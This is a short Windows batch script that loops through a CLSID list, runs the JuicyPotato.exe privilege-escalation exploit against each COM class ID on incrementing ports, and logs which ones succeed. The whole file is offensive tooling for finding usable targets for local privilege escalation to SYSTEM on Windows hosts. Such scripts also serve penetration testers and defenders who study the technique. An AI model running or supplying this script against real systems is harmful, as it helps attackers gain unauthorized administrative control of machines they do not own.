@echo off
:: Starting port, you can change it
set /a port=1234
SETLOCAL ENABLEDELAYEDEXPANSION

FOR /F %%i IN (.\CLSID.list) DO (
   echo %%i !port!
   .\JuicyPotato.exe -z -l !port! -c %%i >> result.log
   set RET=!ERRORLEVEL!
   :: echo !RET!
   if "!RET!" == "1"  set /a port=port+1
)
